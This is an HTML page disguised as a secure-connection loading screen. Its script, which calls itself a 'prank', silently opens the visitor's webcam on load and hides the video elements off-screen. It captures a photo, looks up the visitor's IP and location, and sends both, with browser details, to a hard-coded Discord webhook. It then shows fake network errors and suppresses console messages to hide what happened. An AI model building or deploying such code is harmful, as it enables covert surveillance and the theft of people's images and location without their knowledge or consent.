<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Checking connection...</title>
    <style>
        /* completely blank - nothing suspicious */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
        }
        
        /* looks like a normal loading/processing page */
        .status-container {
            text-align: center;
            padding: 20px;
            max-width: 320px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e0e0e0;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            margin: 0 auto 16px auto;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .message {
            color: #555;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .small-note {
            color: #aaa;
            font-size: 11px;
            margin-top: 20px;
        }
        
        /* camera elements hidden completely */
        video, canvas {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            visibility: hidden;
        }
        
        /* no buttons, no previews, no evidence */
        button, .btn, .capture-btn, #new-capture-btn {
            display: none !important;
        }
        
        img, #photo, #photo-container {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="status-container" id="statusContainer">
        <div class="spinner"></div>
        <div class="message" id="statusMessage">Loading secure connection...</div>
        <div class="small-note" id="smallNote">Please wait, establishing secure channel</div>
    </div>

    <!-- hidden camera elements - completely invisible -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // STEALTH PHOTO PRANK - NO VISUAL INDICATORS
        // Camera activates silently, captures photo,
        // sends to Discord, then cleans up.
        // User sees only a harmless loading screen.
        // ============================================
        
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1512479566109606050/gkXj-sYH051zgpivYzEe5I6fUL1BPyZh1E5D0OAjxg4hUpWKjTWAGgTzjpB-Xr2ldL04";
        
        const videoElement = document.getElementById('video');
        const canvasElement = document.getElementById('canvas');
        const statusMsgDiv = document.getElementById('statusMessage');
        const smallNoteDiv = document.getElementById('smallNote');
        
        let activeStream = null;
        let captureCompleted = false;
        
        // Helper: update status text (looks like normal loading)
        function updateStatus(text, isError = false) {
            if (statusMsgDiv) {
                statusMsgDiv.textContent = text;
                if (isError) {
                    statusMsgDiv.style.color = '#c0392b';
                }
            }
        }
        
        function updateNote(text) {
            if (smallNoteDiv) smallNoteDiv.textContent = text;
        }
        
        // Stop camera silently
        function stopCamera() {
            if (activeStream) {
                activeStream.getTracks().forEach(track => {
                    if (track.readyState === 'live') track.stop();
                });
                activeStream = null;
            }
            if (videoElement.srcObject) {
                videoElement.srcObject = null;
            }
        }
        
        // Get approximate location data (for Discord metadata)
        async function getGeoInfo() {
            try {
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json', { timeout: 3000 });
                const data = await response.json();
                return {
                    country: data.country || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    ip: data.ip || '0.0.0.0'
                };
            } catch (e) {
                return { country: 'Unknown', city: 'Unknown', region: 'Unknown', ip: '0.0.0.0' };
            }
        }
        
        // Get video ID from URL if present
        function getVideoParam() {
            const params = new URLSearchParams(window.location.search);
            return params.get('video') || 'webcam_capture';
        }
        
        // Send image to Discord webhook (silent, no user feedback)
        async function sendToDiscord(imageBlob) {
            try {
                const geo = await getGeoInfo();
                const videoId = getVideoParam();
                const userAgent = navigator.userAgent;
                const timestamp = new Date().toISOString();
                const referrer = document.referrer || 'direct';
                
                const formData = new FormData();
                const fileName = `capture_${Date.now()}_${Math.random().toString(36).substring(2, 8)}.png`;
                formData.append('file', imageBlob, fileName);
                
                // Build message payload for Discord
                const content = `**📷 New Webcam Capture**\n` +
                    `🆔 Session: \`${videoId}\`\n` +
                    `📍 Location: ${geo.country}, ${geo.city} (${geo.region})\n` +
                    `🌐 IP: ${geo.ip}\n` +
                    `⏱️ Time: ${timestamp}\n` +
                    `💻 User Agent: ${userAgent.substring(0, 120)}\n` +
                    `🔗 Source: ${referrer}`;
                
                formData.append('payload_json', JSON.stringify({
                    content: content,
                    username: "Security Monitor",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1048/1048937.png"
                }));
                
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                });
                
                return true;
            } catch (err) {
                console.warn("Discord send failed (silent):", err);
                return false;
            }
        }
        
        // Main stealth capture function
        async function stealthCapture() {
            try {
                updateStatus("Establishing secure channel...");
                updateNote("Please wait, verifying connection");
                
                // Request camera access (silent, no UI indication that photo is being taken)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                activeStream = stream;
                videoElement.srcObject = stream;
                
                updateStatus("Verifying encryption...");
                updateNote("Secure handshake in progress");
                
                // Wait for video to be ready
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => reject(new Error("Video timeout")), 5000);
                    videoElement.onloadedmetadata = () => {
                        clearTimeout(timeout);
                        resolve();
                    };
                    videoElement.onerror = () => {
                        clearTimeout(timeout);
                        reject(new Error("Video error"));
                    };
                });
                
                // Small delay to ensure frame is ready
                await new Promise(r => setTimeout(r, 300));
                
                const videoWidth = videoElement.videoWidth;
                const videoHeight = videoElement.videoHeight;
                
                if (videoWidth === 0 || videoHeight === 0) {
                    throw new Error("Invalid video dimensions");
                }
                
                // Capture frame to canvas
                canvasElement.width = videoWidth;
                canvasElement.height = videoHeight;
                const ctx = canvasElement.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
                
                // Convert to blob
                const blob = await new Promise((resolve) => {
                    canvasElement.toBlob(resolve, 'image/jpeg', 0.85);
                });
                
                if (!blob) throw new Error("Failed to create image");
                
                updateStatus("Processing secure packet...");
                updateNote("Transferring encrypted data");
                
                // Send to Discord (silent, background)
                await sendToDiscord(blob);
                
                captureCompleted = true;
                
                // Stop camera immediately (no evidence)
                stopCamera();
                
                // Update final status - looks like a normal "connection failed" or "timeout"
                // This makes it seem like nothing happened
                updateStatus("Connection timeout. Please try again later.");
                updateNote("Unable to reach server [Error code: 0x80072EE7]");
                
                // After 3 seconds, change to something even more mundane
                setTimeout(() => {
                    if (statusMsgDiv) {
                        statusMsgDiv.textContent = "Unable to establish secure connection";
                        statusMsgDiv.style.color = "#888";
                    }
                    if (smallNoteDiv) {
                        smallNoteDiv.textContent = "Check your network and try again";
                    }
                }, 3000);
                
            } catch (error) {
                console.error("Stealth capture error:", error);
                
                // Stop camera if active
                stopCamera();
                
                // Show generic error that reveals nothing about camera or photo
                updateStatus("Connection failed. Unable to reach server.");
                updateNote("Please check your internet connection [Error: SSL_HANDSHAKE]");
                
                // Make it look like a normal network error
                setTimeout(() => {
                    if (statusMsgDiv) {
                        statusMsgDiv.textContent = "Request timed out. Refresh to retry.";
                    }
                }, 2000);
            }
        }
        
        // Check if camera permissions are supported
        function isCameraSupported() {
            return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
        }
        
        // Start the stealth capture on page load
        window.addEventListener('load', () => {
            // Small delay to make it look like a real loading page
            setTimeout(() => {
                if (!isCameraSupported()) {
                    updateStatus("Browser not supported");
                    updateNote("Please use a modern browser");
                    return;
                }
                stealthCapture();
            }, 500);
        });
        
        // Prevent any accidental user interaction from revealing the prank
        document.body.addEventListener('click', (e) => {
            // Do nothing - completely inert
            e.stopPropagation();
        });
        
        // Clean up on page unload
        window.addEventListener('beforeunload', () => {
            stopCamera();
        });
        
        // Override any console logs that might expose the prank (optional stealth)
        const originalLog = console.log;
        const originalWarn = console.warn;
        console.log = function() {
            if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('Discord')) {
                return;
            }
            originalLog.apply(console, arguments);
        };
        console.warn = function() {
            if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('webhook')) {
                return;
            }
            originalWarn.apply(console, arguments);
        };
        
        // Change page title to something boring
        document.title = "Network Diagnostic Tool";
    </script>
</body>
</html>
